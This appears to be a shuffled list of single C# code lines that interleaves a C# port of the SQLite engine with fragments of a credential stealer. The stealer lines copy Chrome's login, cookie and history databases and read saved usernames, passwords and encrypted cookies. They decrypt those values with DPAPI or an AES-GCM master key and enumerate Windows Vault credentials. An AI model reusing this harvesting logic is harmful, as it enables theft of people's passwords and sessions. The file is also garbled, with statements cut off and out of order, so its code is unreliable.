"                        FieldInfo dateTimeInfo = currentItem.GetType().GetField(""LastModified"")"
"                        FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField(""pAuthenticatorElement"")"
"                        FieldInfo pIdentityElementInfo = currentItem.GetType().GetField(""pIdentityElement"")"
"                        FieldInfo pResourceElementInfo = currentItem.GetType().GetField(""pResourceElement"")"
"                        FieldInfo schemaIdInfo = currentItem.GetType().GetField(""SchemaId"")"
"                        cookie_value = DecryptWithKey(cookieBytes, masterKey)"
"                        cookie_value = Encoding.UTF8.GetString(ProtectedData.Unprotect(cookieBytes, null, DataProtectionScope.CurrentUser))"
"                        if ( sqlite3StrICmp( zLeft, ""incremental_vacuum"" ) == 0 )"
"                        object passwordItem = System.Runtime.InteropServices.Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM)"
"                        password = DecryptWithKey(passwordBytes, masterKey)"
"                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser))"
"                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Double))"
"                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Guid))"
"                        sqlite3Atoi64( zRight, ref iLimit )"
"                        sqlite3PagerLockingMode( pPager, eMode )"
"                        title = (string)row[""title""]"
"                        url = (string)row[""url""]"
"                        var currentItem = System.Runtime.InteropServices.Marshal.PtrToStructure(structAddress, VAULT_ITEM)"
"                       This is typically a union of many types, one of"
"                       and nonterminal numbers.  ""unsigned char"" is"
"                       and nonterminals.  ""int"" is used otherwise."
"                       defined, then do no error processing."
"                       for base tokens is called ""yy0""."
"                       states combined.  ""int"" is used otherwise."
"                      2, SQLITE_UTF8, 0 )"
"                      _buf = longvalue.ToString( new string( '0', width - ( ( prefix != '"
"                      eMode = sqlite3PagerJournalMode( pPager, eMode )"
"                      iLimit = sqlite3PagerJournalSizeLimit( pPager, iLimit )"
"                      if ( sqlite3StrICmp( pUsing.a[k].zName, zCol ) == 0 )"
"                      if ( sqlite3StrICmp( zLeft, ""auto_vacuum"" ) == 0 )"
"                      int j, n"
"                      rc = sqlite3BtreeKeySize( pC.pCursor, ref v )"
"                      rc = sqlite3BtreeSavepoint( db.aDb[ii].pBt, p1, iSavepoint )"
"                      returnSingleInt( pParse, ""journal_size_limit"", iLimit )"
"                      sqlite3ResetInternalSchema( db, 0 )"
"                      sqlite3_randomness( sizeof( i64 ), ref v )"
"                      {//, pTerm"
"                     of the query.  This destination implies ""LIMIT 1""."
"                     results.  Used to implement ""IN (SELECT ...)""."
"                     sqlite3ExprDup( db, pExpr.pLeft, 0 ),"
"                    //memcpy(pNew.zName, zName, nName"
"                    //sqlite3DbFree( db, pSavepoint )"
"                    //sqlite3DbFree( db, pTmp )"
"                    Buffer.BlockCopy( pData.zBLOB, 0, pC.pData, 0, pC.nData )"
"                    Console.WriteLine("""
"                    Console.WriteLine(""===============Chrome============="")"
"                    Console.WriteLine(""===============IE============="")"
"                    Console.WriteLine(""["
"                    Marshal.Copy(aad, 0, pbAuthData, cbAuthData)"
"                    Marshal.Copy(iv, 0, pbNonce, cbNonce)"
"                    Marshal.Copy(tag, 0, pbTag, cbTag)"
"                    Match match = Regex.Match(booktext, @""URL=(."
"                    REGISTER_TRACE( p, pOp.p3, pMem )"
"                    azModeName[eMode], P4_STATIC )"
"                    byte[] cookieBytes = Convert.FromBase64String((string)row[""encrypted_value""].ToString())"
"                    columnValues[i] = """""
"                    columnValues[i] = CSSQLite.sqlite3_column_double( vm, i )"
"                    columnValues[i] = CSSQLite.sqlite3_column_int( vm, i )"
"                    columnValues[i] = CSSQLite.sqlite3_column_text( vm, i )"
"                    crypt_password = row[""password_value""].ToString()"
"                    eMode = sqlite3PagerLockingMode( pPager, eMode ) "
"                    if ( sqlite3StrICmp( zLeft, ""journal_size_limit"" ) == 0 )"
"                    inPar = disk.GetMethodParameters(""GetOwner"")"
"                    info = myreg.GetValue(""url"" "
"                    outPar = disk.InvokeMethod(""GetOwner"", inPar, null)"
"                    pOp.p4.pKeyInfo, pCx.pCursor )"
"                    rc = sqlite3BtreeCursor( pCx.pBt, pgno, 1,"
"                    rc = sqlite3BtreeLast( pC.pCursor, ref res )"
"                    rc = sqlite3BtreeMovetoUnpacked( pC.pCursor, null, v, 0, ref res )"
"                    rc = sqlite3BtreeNext( pC.pCursor, ref res )"
"                    rc = sqlite3BtreePrevious( pC.pCursor, ref res )"
"                    sqlite3VdbeAddOp2( v, OP_ResultRow, 1, 1 )"
"                    sqlite3VdbeAddOp4( v, OP_String8, 0, 1, 0,"
"                    sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""journal_mode"", SQLITE_STATIC )"
"                    sqlite3VdbeSetNumCols( v, 1 )"
"                    sqlite3_snprintf( 3, ref zTemp, ""%02d"", ( nDay "
"                    sqlite3_snprintf( 4, ref zTemp, ""%03d"", nDay "
"                    string host_key = (string)row[""host_key""].ToString()"
"                    string name = (string)row[""name""].ToString()"
"                    table.Columns.Add( columnName, Type.GetType( ""System.Double"" ) )"
"                    table.Columns.Add( columnName, Type.GetType( ""System.Int64"" ) )"
"                    table.Columns.Add( columnName, Type.GetType( ""System.String"" ) )"
"                    table.Columns.Add( columnName, typeof(byte[]) )"
"                    table.Columns.Add( columnName, typeof(string) )"
"                    text1 = outPar[""User""].ToString()"
"                    throw new CryptographicException(""BCrypt.BCryptDecrypt(): authentication tag mismatch"")"
"                    throw new CryptographicException(string.Format(""BCrypt.BCryptDecrypt() (get size) failed with status code: {0}"", status))"
"                    throw new CryptographicException(string.Format(""BCrypt.BCryptDecrypt() failed with status code:{0}"", status))"
"                    throw new Exception(""Unable to open the following vault: "" "
"                    throw new Exception(""[ERROR] Unable to enumerate vault items from the following vault: "" "
"                    url = (string)row[""origin_url""].ToString()"
"                    username = (string)row[""username_value""].ToString()"
"                    zColname = sqlite3MPrintf( db, ""%s.%s"", zTabName, zName )"
"                    zData = sqlite3BtreeDataFetch( pCrsr, ref avail, ref pC.aRow )"
"                    zData = sqlite3BtreeKeyFetch( pCrsr, ref avail, ref pC.aRow )"
"                    zRet = ""exclusive"""
"                   ""PRIMARY KEY must be unique"", P4_STATIC )"
"                   aTempRec, 0 )"
"                  ""SQL statements in progress"" )"
"                  ""cannot %s savepoint - SQL statements in progress"","
"                  //sqlite3DbFree( db, ref pC.pData )"
"                  //sqlite3DbFree( db, ref zSql )"
"                  Array.Resize( ref p.contextStack, i "
"                  Buffer.BlockCopy( pCrsr.info.pCell, pC.aRow, zRec, 0, (int)payloadSize )"
"                  Debug.Assert( !ExprHasProperty( pExpr, EP_IntValue ) )"
"                  Debug.Assert( !ExprHasProperty( pExpr, EP_xIsSelect ) )"
"                  MemSetTypeFlag( pOut, MEM_Int )"
"                  MemSetTypeFlag( pOut, MEM_Null )"
"                  REGISTER_TRACE( p, pOp.p2, pOut )"
"                  _buf = Convert.ToString( (long)longvalue, 8 ).ToCharArray()"
"                  _buf = longvalue.ToString( ""x"" ).ToCharArray()"
"                  applyAffinity( pRec, (char)zAffinity[pD0], encoding )"
"                  buf = """
"                  buf = ""-Inf"".ToCharArray()"
"                  buf = ""Inf"".ToCharArray()"
"                  columnIndex( pLeft.pTab, zName ) >= 0 )"
"                  db.xTrace( db.pTraceArg, zTrace )"
"                  if ( pC.nData > 0 ) Buffer.BlockCopy( pData.zBLOB, 0, pC.pData, 0, pC.nData )"
"                  if ( sqlite3IdListIndex( pTabList.a[i].pUsing, zName ) >= 0 )//pLeft[1]"
"                  if ( zLeft == ""journal_mode"" )"
"                  pExpr = sqlite3PExpr( pParse, TK_DOT, pLeft, pRight, 0 )"
"                  pExpr.u.zToken, sqlite3Strlen30( pExpr.u.zToken ),"
"                  pItem.pFunc = sqlite3FindFunction( pParse.db,"
"                  pLeft = sqlite3Expr( db, TK_ID, zTabName )"
"                  r = sqlite3ExprCodeGetColumn( pParse, pTabItem.pTab, -1, iCur,"
"                  r, iSet, P4_INT32 )"
"                  rc = sqlite3BtreeCreateTable( pCx.pBt, ref pgno, BTREE_ZERODATA )"
"                  rc = sqlite3BtreeCursor( pCx.pBt, MASTER_ROOT, 1, null, pCx.pCursor )"
"                  rc = sqlite3BtreeDataSize(pCrsr, ref payloadSize)"
"                  rc = sqlite3BtreeInsert( pCrsr, zKey, nKey, new byte[1], 0, 0, (pOp.p3 != 0)"
"                  rc = sqlite3BtreeKeySize( pC.pCursor, ref v )"
"                  rc = sqlite3BtreeMovetoUnpacked( pC.pCursor, null, iKey, 0, ref res )"
"                  rc = sqlite3BtreeMovetoUnpacked( pC.pCursor, r, 0, 0, ref res )"
"                  rc = sqlite3OsWrite( pFile, zData, nSrcPagesize, iOff )"
"                  rc = sqlite3VdbeIdxRowid( db, pCrsr, ref rowid )"
"                  rc = sqlite3VdbeMemFromBtree( pCrsr, (int)aOffset[p2], len, pC.isIndex, sMem )"
"                  rc = sqlite3VdbeMemFromBtree( pCrsr, 0, len, pC.isIndex, sMem )"
"                  rc = sqlite3_exec( db, zSql, (dxCallback)sqlite3InitCallback, (object)initData, 0 )"
"                  rc=sqlite3BtreeKeySize( pCrsr, ref payloadSize64 )"
"                  regRowid, false )"
"                  sqlite3BtreeSetCachedRowid( pC.pCursor, v < MAX_ROWID "
"                  sqlite3DebugPrintf( ""SQL-trace: %s"
"                  sqlite3ExprCacheAffinityChange( pParse, r3, 1 )"
"                  sqlite3ResetInternalSchema( db, pOp.p1 )"
"                  sqlite3RootPageMoved( db.aDb[iDb], iMoved, pOp.p1 )"
"                  sqlite3SetString( ref p.zErrMsg, db, ""cannot open savepoint - "","
"                  sqlite3SetString( ref p.zErrMsg, db, ""no such savepoint: %s"", zName )"
"                  sqlite3SetString( ref p.zErrMsg, db,"
"                  sqlite3VdbeAddOp2( v, OP_IdxInsert, pExpr.iTable, r2 )"
"                  sqlite3VdbeAddOp2( v, OP_MustBeInt, r3, sqlite3VdbeCurrentAddr( v ) "
"                  sqlite3VdbeAddOp2( v, OP_ResultRow, 1, 1 )"
"                  sqlite3VdbeAddOp2( v, OP_SCopy, r2, r1 )"
"                  sqlite3VdbeAddOp3( v, OP_Insert, pExpr.iTable, r2, r3 )"
"                  sqlite3VdbeAddOp4( v, OP_MakeRecord, r3, 1, r2, affinity, 1 )"
"                  sqlite3VdbeAddOp4( v, OP_RowSetTest, regRowset,"
"                  sqlite3VdbeAddOp4( v, OP_String8, 0, 1, 0, zRet, 0 )"
"                  sqlite3VdbeChangeToNoop( v, testAddr - 1, 2 )"
"                  sqlite3VdbeMemMove( sMem, pDest )"
"                  sqlite3VdbeMemShallowCopy( pDest, pOp.p4.pMem, MEM_Static )"
"                  sqlite3VdbeSerialGet( zData, aType[p2], pDest )"
"                  sqlite3VdbeSerialGet( zRec, (int)aOffset[p2], aType[p2], pDest )"
"                  sqlite3VdbeSetColName( v, 0, COLNAME_NAME, ""locking_mode"", SQLITE_STATIC )"
"                  sqlite3VdbeSetNumCols( v, 1 )"
"                  sqlite3_snprintf( 20, ref zTemp, ""%.16g"", x.iJD / 86400000.0 )"
"                  sqlite3_snprintf( 30, ref zTemp, ""%lld"","
"                  sqlite3_snprintf( 5, ref zTemp, ""%04d"", x.Y )"
"                  sqlite3_snprintf( 7, ref zTemp, ""%06.3f"", s )"
"                  string zRet = ""normal"""
"                  zTemp.Append( "",..."" )"
"                  zTemp.Append( ""-"" )"
"                  {//, pCol"
"                 ended by a semicolon, the keyword END, and another semicolon."
"                 statement, possibly preceeded by EXPLAIN and/or followed by"
"                ""SELECT name, rootpage, sql FROM '%q'.%s WHERE %s"","
"                ""SQL statements in progress"" )"
"                ""cannot commit - no transaction is active"" ) )"
"                ""conflicting ON CONFLICT clauses specified"", 0 )"
"                , pData.n, nZero,"
"                //   yyTracePrompt, yyTokenName[iLookAhead], yyTokenName[YYWILDCARD])"
"                //fprintf(yyTraceFILE, ""%sWILDCARD %s => %s"
"                //memcpy(pPage1.aData[32], pTrunk.aData[0], 4)"
"                //memcpy(pPrevTrunk.aData[0], pTrunk.aData[0], 4)"
"                //sqlite3DbFree( db, zToFree )"
"                //sqlite3DbFree(db,ref p.zErrMsg)"
"                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length)"
"                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16)"
"                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15)"
"                Buffer.BlockCopy( pIn1.zBLOB, 0, pOut.zBLOB, pIn2.n, pIn1.n )"
"                Buffer.BlockCopy( pIn2.zBLOB, 0, pOut.zBLOB, 0, pIn2.n )"
"                Buffer.BlockCopy(aData, (int)(4 "
"                Buffer.BlockCopy(array, 0, result, offset, array.Length)"
"                Console.WriteLine("""
"                Console.WriteLine(""[-] {0} Not Found!"", chrome_History_path)"
"                Console.WriteLine(""[-] {0} Not Found!"", chrome_book_path)"
"                Console.WriteLine(""[-] {0} Not Found!"", chrome_cookie_path)"
"                Console.WriteLine(""[-] {0} Not Found!"", login_data_path)"
"                Debug.Assert( !ExprHasAnyProperty( pExpr, EP_TokenOnly "
"                Debug.Assert( z == """" )"
"                Expr pExpr, pRight"
"                ExprSetProperty( pExpr, EP_VarSelect )"
"                FieldInfo partialElementInfo = partialElement.GetType().GetField(""Type"")"
"                File.Copy(chrome_History_path, cookie_tempFile, true)"
"                File.Copy(chrome_cookie_path, cookie_tempFile, true)"
"                File.Copy(login_data_path, login_data_tempFile, true)"
"                MemSetTypeFlag( pIn1, MEM_Blob )"
"                MemSetTypeFlag( pIn1, MEM_Int )"
"                MemSetTypeFlag( pOut, MEM_Int )"
"                MemSetTypeFlag( pOut, MEM_Null )"
"                MemSetTypeFlag( pOut, MEM_Real )"
"                REGISTER_TRACE( p, p1 "
"                REGISTER_TRACE( p, p2 "
"                REGISTER_TRACE( p, p2"
"                REGISTER_TRACE( p, pOp.p1 "
"                REGISTER_TRACE( p, pOp.p2, pArg )"
"                REGISTER_TRACE( p, pOp.p2, pOut )"
"                applyAffinity( pIn1, SQLITE_AFF_TEXT, encoding )"
"                applyAffinity( pIn1, affinity, encoding )"
"                applyAffinity( pIn3, affinity, encoding )"
"                applyAffinity( pRec, (char)zAffinity[pD0 - pOp.p1], encoding )"
"                azColName[i], SQLITE_STATIC )"
"                azCols[i] = sqlite3_column_name( pStmt, i )"
"                azVals[i] = sqlite3_column_text( pStmt, i )"
"                byte[] and_logic = new byte[] { 0, 0, 0, 0, 1, 2, 0, 2, 2 }"
"                byte[] nullRecord = { 0x02, 0x00 }"
"                byte[] or_logic = new byte[] { 0, 1, 2, 1, 1, 1, 2, 1, 2 }"
"                c2 = sqlite3Utf8Read( zString, ref zString )"
"                cache entry and return a pointer to it. Again, the first"
"                cache implementation has two choices: it can return NULL,"
"                checkPtrmap(pCheck, iFreePage, PTRMAP_FREEPAGE, 0, zContext)"
"                columnName = CSSQLite.sqlite3_column_name( vm, i )"
"                columnType = CSSQLite.sqlite3_column_type( vm, i )"
"                createFlag==2, SQLite assumes that a memory allocation "
"                db.aDb[iDb].zName, zMaster, pOp.p4.z )"
"                db.xUpdateCallback( db.pUpdateArg, SQLITE_DELETE, zDb, zTbl, iKey )"
"                db.xUpdateCallback( db.pUpdateArg, op, zDb, zTbl, iKey )"
"                exists = sqlite3RowSetTest( pIn1.u.pRowSet,"
"                generateColumnNames( pParse, null, pFirst.pEList )"
"                i = addAggInfoFunc( pParse.db, pAggInfo )"
"                iCol = resolveOrderByTermToExprList( pParse, pSelect, pDup )"
"                if ( sqlite3ExprCompare( pItem.pExpr, pExpr ) )"
"                if ( sqlite3StrICmp( zLeft, ""locking_mode"" ) == 0 )"
"                if ( sqlite3StrICmp( zTabName, zTab ) != 0 ) continue"
"                if ( sqlite3VdbeMemGrow( pOut, (int)n, 0 ) != 0 )"
"                if (processname == ""explorer"")"
"                int columnType = CSSQLite.sqlite3_column_type( vm, i )"
"                int d2 = (int)(sqlite3Get4byte(aData, 8 "
"                int iDb = sqlite3SchemaToIndex( pNC.pParse.db, pTab.pSchema )"
"                j3 = sqlite3VdbeAddOp1( v, OP_NotNull, rMayHaveNull )"
"                j4 = sqlite3VdbeAddOp3( v, OP_Found, pExpr.iTable, 0, rMayHaveNull )"
"                keyInfo.aColl[0] = sqlite3BinaryCompareCollSeq( pParse, pExpr.pLeft,"
"                longvalue = (i64)va_arg( ap, ""long int"" )"
"                longvalue = (i64)va_arg( ap, ""long"" )"
"                longvalue = (i64)va_arg( ap, ""longlong int"" )"
"                nullRecord, P4_STATIC )"
"                object partialElement = System.Runtime.InteropServices.Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT))"
"                object vaultGuidString = System.Runtime.InteropServices.Marshal.PtrToStructure(guidAddress, typeof(Guid))"
"                p.zErrMsg = ""database schema has changed"""
"                pCol.pTab, pCol.iColumn, pCol.iTable, r1, false )"
"                pColl = sqlite3ExprCollSeq( pParse, pFarg.a[i].pExpr )"
"                pIdxKey = sqlite3VdbeRecordUnpack( pC.pKeyInfo, pIn3.n, pIn3.zBLOB,"
"                pNew = sqlite3ExprListAppend( pParse, pNew, pExpr )"
"                pRight = sqlite3Expr( db, TK_ID, zName )"
"                page is allocated, then the first sizeof(void"
"                pages before re-requesting the same page, or it can"
"                ptrmapPut(pBt, sqlite3Get4byte(apCell[i]), PTRMAP_BTREE, pNew.pgno, ref rc)"
"                ptrmapPutOvflPtr(pNew, apCell[i], ref rc)"
"                r2 = sqlite3ExprCodeGetColumn( pParse,"
"                r3 = sqlite3ExprCodeTarget( pParse, pE2, r1 )"
"                rc = pager_end_transaction( pPager, 0 )"
"                rc = sqlite3BtreeBeginStmt( pBt, p.iStatement )"
"                rc = sqlite3BtreeBeginTrans( pBt, pOp.p2 )"
"                rc = sqlite3BtreeBeginTrans( pCx.pBt, 1 )"
"                rc = sqlite3BtreeCount( pCrsr, ref nEntry )"
"                rc = sqlite3BtreeData( pCrsr, 0, (u32)n, pOut.zBLOB )"
"                rc = sqlite3BtreeDataSize( pCrsr, ref n )"
"                rc = sqlite3BtreeDropTable( db.aDb[iDb].pBt,pOp.p1, ref iMoved )"
"                rc = sqlite3BtreeFirst( pCrsr, ref res )"
"                rc = sqlite3BtreeInsert( pC.pCursor, null, iKey,"
"                rc = sqlite3BtreeKey( pCrsr, 0, n, pOut.zBLOB )"
"                rc = sqlite3BtreeLast( pCrsr, ref res )"
"                rc = sqlite3BtreeMovetoUnpacked( pC.pCursor, pIdxKey, 0, 0, ref res )"
"                rc = sqlite3BtreeMovetoUnpacked( pCrsr, null, (long)iKey, 0, ref res )"
"                rc = sqlite3BtreeMovetoUnpacked( pCrsr, r, 0, 0, ref pCx.seekResult )"
"                rc = sqlite3BtreeMovetoUnpacked( pCrsr, r, 0, 0, ref res )"
"                rc = sqlite3OsOpen( pVfs, pPager.zJournal, pPager.jfd, f, ref fout )"
"                rc = sqlite3OsRead( pPager.jfd, first, 1, 0 )"
"                rc = sqlite3PagerGet( pSrcPager, iSrcPg, ref pSrcPg )"
"                rc = sqlite3VdbeIdxKeyCompare( pC, r, ref res )"
"                rc=sqlite3BtreeKeySize( pCrsr, ref n64 )"
"                result = VaultCli.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr)"
"                result = VaultCli.VaultOpenVault(ref vaultGuid, (UInt32)0, ref vaultHandle)"
"                return """""
"                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser)"
"                serial_type = sqlite3VdbeSerialType( pRec, file_format )"
"                sqlite3BtreeGetMeta( pBt, BTREE_SCHEMA_VERSION, ref iMeta )"
"                sqlite3CodeVerifySchema( pParse, iDb )"
"                sqlite3ErrorMsg( pParse, ""interrupt"" )"
"                sqlite3ErrorMsg( pParse, ""misuse of aliased aggregate %s"", zAs )"
"                sqlite3ErrorMsg( pParse, ""no such table: %s"", zTName )"
"                sqlite3ErrorMsg( pParse, ""no tables specified"" )"
"                sqlite3ErrorMsg( pParse, ""subqueries prohibited in CHECK constraints"" )"
"                sqlite3ErrorMsg( pParse,"
"                sqlite3ExprListSetName( pParse, pNew, sColname, 0 )"
"                sqlite3GenerateRowIndexDelete( pParse, pTab, baseCur, 0 )"
"                sqlite3OsDelete( pVfs, pPager.zJournal, 0 )"
"                sqlite3OsUnlock( pPager.fd, SHARED_LOCK )"
"                sqlite3Put4byte(pPage.aData, pCell "
"                sqlite3Put4byte(pPage1.aData, (u32)32, iNewTrunk)"
"                sqlite3Put4byte(pPrevTrunk.aData, (u32)0, iNewTrunk)"
"                sqlite3RowSetInsert( pIn1.u.pRowSet, pIn3.u.i )"
"                sqlite3Select( pParse, ss, ref dest )"
"                sqlite3SelectDelete( db, ref ss )"
"                sqlite3SelectDestInit( dest, SRT_Discard, 0 )"
"                sqlite3SetString( ref p.zErrMsg, db, ""%s"", pOp.p4.z )"
"                sqlite3SetString( ref p.zErrMsg, db, ""cannot commit transaction - "" "
"                sqlite3SetString( ref p.zErrMsg, db, ""cannot rollback transaction - "" "
"                sqlite3SetString( ref p.zErrMsg, db, sqlite3_value_text( ctx.s ) )"
"                sqlite3SetString( ref p.zErrMsg, db, sqlite3_value_text( pMem ) )"
"                sqlite3SetString( ref p.zErrMsg, db,"
"                sqlite3StrAccumAppend( errMsg, zCol, -1 )"
"                sqlite3StrAccumAppend( errMsg, zSep, -1 )"
"                sqlite3StrAccumAppend( pAccum, ""."", 1 )"
"                sqlite3StrAccumAppend( pAccum, pItem.zDatabase, -1 )"
"                sqlite3StrAccumAppend( pAccum, pToken.z.ToString(), (int)pToken.n )"
"                sqlite3VdbeAddOp2( _v, OP_Pagecount, iDb, iReg )"
"                sqlite3VdbeAddOp2( _v, OP_ResultRow, iReg, 1 )"
"                sqlite3VdbeAddOp2( v, OP_Copy, rNotFound, target )"
"                sqlite3VdbeAddOp2( v, OP_Gosub, regReturn, iLoopBody )"
"                sqlite3VdbeAddOp2( v, OP_Goto, 0, ignoreDest )"
"                sqlite3VdbeAddOp2( v, OP_Integer, 0, rNotFound )"
"                sqlite3VdbeAddOp2( v, OP_Integer, 0, target )"
"                sqlite3VdbeAddOp2( v, OP_Null, 0, rNotFound )"
"                sqlite3VdbeAddOp4( v, OP_Blob, 2, rMayHaveNull, 0,"
"                sqlite3VdbeAddOp4( v, OP_Halt, SQLITE_CONSTRAINT, onError, 0,"
"                sqlite3VdbeChangeP4( v, -1, pExpr.u.zToken, 0 )"
"                sqlite3VdbeDeleteAuxData( ctx.pVdbeFunc, pOp.p1 )"
"                sqlite3VdbeJumpHere( v, j3 )"
"                sqlite3VdbeJumpHere( v, j4 )"
"                sqlite3VdbeMemMove( pOut, pIn1 )"
"                sqlite3VdbeMemSetInt64( pOut, "
"                sqlite3VdbeMemSetInt64( pOut, sqlite3VdbeIntValue( pIn1 ) == 0 "
"                sqlite3VdbeMemSetInt64( pOut, val )"
"                sqlite3VdbeMemSetStr(pIn1, z, -1, SQLITE_UTF8, null)"
"                sqlite3VdbeMemShallowCopy( pOut, pVar, MEM_Static )"
"                sqlite3VdbeSetChanges( db, p.nChange )"
"                sqlite3VdbeSetColName( _v, 0, COLNAME_NAME, ""page_count"", SQLITE_STATIC )"
"                sqlite3VdbeSetNumCols( _v, 1 )"
"                sqlite3_result_error( context, ""integer overflow"", -1 )"
"                status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, plainText, plainText.Length, ref plainTextSize, 0x0)"
"                storeTypeInfo( p.pResultSet[i], encoding )"
"                storeTypeInfo( pArg, encoding )"
"                storeTypeInfo( pRec, encoding )"
"                string query = ""SELECT host_key, name,encrypted_value FROM cookies"""
"                string query = ""SELECT origin_url, username_value, password_value FROM logins"""
"                string query = ""select url,title from urls"""
"                szHdr = getVarint32( zData, ref  offset )"
"                text1 = ""SYSTEM"""
"                throw new CryptographicException(string.Format(""BCrypt.BCryptGetProperty() (get size) failed with status code:{0}"", status))"
"                throw new CryptographicException(string.Format(""BCrypt.BCryptGetProperty() failed with status code:{0}"", status))"
"                throw new CryptographicException(string.Format(""BCrypt.BCryptImportKey() failed with status code:{0}"", status))"
"                throw new CryptographicException(string.Format(""BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}"", status))"
"                throw new CryptographicException(string.Format(""BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}"", status))"
"                throw new Exception(""[ERROR] Unable to enumerate vaults. Error (0x"" "
"                uint status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, null, 0, ref plainTextSize, 0x0)"
"                v = (int)va_arg( ap, ""int"" )"
"                v = (long)va_arg( ap, ""i64"" )"
"                v = (long)va_arg( ap, ""long int"" )"
"                var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag))"
"                zOriginCol = ""rowid"""
"                zSep = "", """
"                zSql = sqlite3MPrintf( db,"
"                zTemp.Append( "","" )"
"                zTemp.Append( "",nil"" )"
"                zToFree = """""
"                zType = ""INTEGER"""
"                zType = columnType( sNC, p, ref zOriginDb, ref zOriginTab, ref zOriginCol )"
"               (Note, this list is NOT null terminated.)"
"              "": %d more free pages"
"              ""RAISE() may only be used within a trigger-program"" )"
"              ""not present in both tables"", zName )"
"              ""the GROUP BY clause"" )"
"              (int)pnErr.u.i, ref nErr )"
"              , ""%s - %s"", pData.pzErrMsg, zExtra )"
"              //  memcpy( pOut.z, pIn2.z, pIn2.n )"
"              //if ( sqlite3VdbeMemGrow( pOut, (int)nByte "
"              //if ( sqlite3VdbeMemGrow( pOut, (int)nByte, 0 ) != 0 )"
"              //memcpy(pNewTrunk.aData[0], pTrunk.aData[0], 4)"
"              //pParse.zTail = new StringBuilder(zSql.Substring( i,zSql.Length-i ))"
"              //sqlite3DbFree( db, ref aRoot )"
"              //sqlite3DbFree( db, ref p4 )"
"              //sqlite3DbFree( db, ref pVdbeFunc )"
"              //sqlite3DbFree( db, ref pzErrMsg )"
"              //sqlite3DbFree( db, ref tmp )"
"              //sqlite3DbFree( db, ref zMaster )"
"              //sqlite3DbFree( errMsg.db, zErr )"
"              Array.Copy( _buf, 0, buf, bufpt, _buf.Length )"
"              Buffer.BlockCopy( buf, offset, pMem.zBLOB, 0, (int)len )"
"              Buffer.BlockCopy(pPage.aData, pCell - pPage.childPtrSize, pCellBody, 0, pCellBody.Length)"
"              Buffer.BlockCopy(pTrunk.aData, 12, pNewTrunk.aData, 8, (int)(k - 1) "
"              Debug.Assert( !ExprHasAnyProperty( pExpr, EP_TokenOnly "
"              Debug.Assert( !ExprHasProperty( p.pEList.a[0].pExpr, EP_xIsSelect ) )"
"              Debug.Assert( !ExprHasProperty( pE.pLeft, EP_IntValue ) )"
"              Debug.Assert( !ExprHasProperty( pExpr, EP_IntValue ) )"
"              Encoding.UTF8.GetBytes( pExpr.u.zToken ), 0 )"
"              ExprSetProperty(p, EP_xIsSelect)"
"              ExprSetProperty(yygotominor.yy346.pExpr, EP_xIsSelect)"
"              IOTRACE( ""JSYNC %p"
"              MemSetTypeFlag( ctx.s, MEM_Null )"
"              MemSetTypeFlag( pDest, MEM_Null )"
"              MemSetTypeFlag( pOut, MEM_Blob )"
"              MemSetTypeFlag( pOut, MEM_Int )"
"              MemSetTypeFlag( pOut, MEM_Str )"
"              PAGERTRACE( ""SYNC journal of %d"
"              Pgno iFreePage = sqlite3Get4byte(pOvflData, 8 "
"              Pgno iNewTrunk = sqlite3Get4byte(pTrunk.aData, 8)"
"              REGISTER_TRACE( p, pOp.p1, pIn1 )"
"              REGISTER_TRACE( p, pOp.p2, pData )"
"              REGISTER_TRACE( p, pOp.p2, pIn2 )"
"              REGISTER_TRACE( p, pOp.p2, pOut )"
"              REGISTER_TRACE( p, pOp.p3, pDest )"
"              REGISTER_TRACE( p, pOp.p3, pIn3 )"
"              REGISTER_TRACE( p, pOp.p3, pKey )"
"              REGISTER_TRACE( p, pOp.p3, pOut )"
"              SQLITE_SKIP_UTF8( z, ref iz )"
"              SQLITE_SKIP_UTF8( zString, ref len )"
"              Select ss = sqlite3SelectDup( db, pTriggerStep.pSelect, 0 )"
"              SrcList pSrc = (SrcList)va_arg( ap, ""SrcList"" )"
"              TRACE(""ALLOCATE: %d was leaf %d of %d on trunk %d"" "
"              Token pToken = (Token)va_arg( ap, ""Token"" )"
"              VdbeComment( v, ""%s"", pIdx.zName )"
"              VdbeComment( v, ""%s() by index"","
"              VdbeComment( v, ""Init EXISTS result"" )"
"              VdbeComment( v, ""Init subquery result"" )"
"              VdbeComment( v, ""Jump ahead if LIMIT reached"" )"
"              VdbeComment( v, ""raise(IGNORE)"" )"
"              addWhereTerm( pParse, zName, pLeftTab, pLeft.zAlias,"
"              addr = sqlite3VdbeAddOp1( v, OP_IfZero, p.iLimit )"
"              addr = sqlite3VdbeAddOp2( v, OP_OpenEphemeral, unionTab, 0 )"
"              analyzeTable( pParse, pTab )"
"              applyAffinity( pIn1, SQLITE_AFF_NUMERIC, encoding )"
"              applyAffinity( pIn1, SQLITE_AFF_TEXT, encoding )"
"              argument.  For example,  printf(""%.78'-"")  prints 78 minus"
"              bestIndex( pParse, pAndWC, pSrc, notReady, null, ref sTermCost )"
"              bestIndex( pParse, tempWC, pSrc, notReady, null, ref sTermCost )"
"              btreeParseCellPtr( pPage, pCellBody, ref pCur.info )"
"              buf = ""NaN"".ToCharArray()"
"              buf.CopyTo( pMem.zBLOB, 0 )"
"              c = sqlite3VdbeRecordCompare(nCell, pCellKey, pIdxKey)"
"              c = sqlite3VdbeRecordCompare(nCell, pPage.aData, pCell "
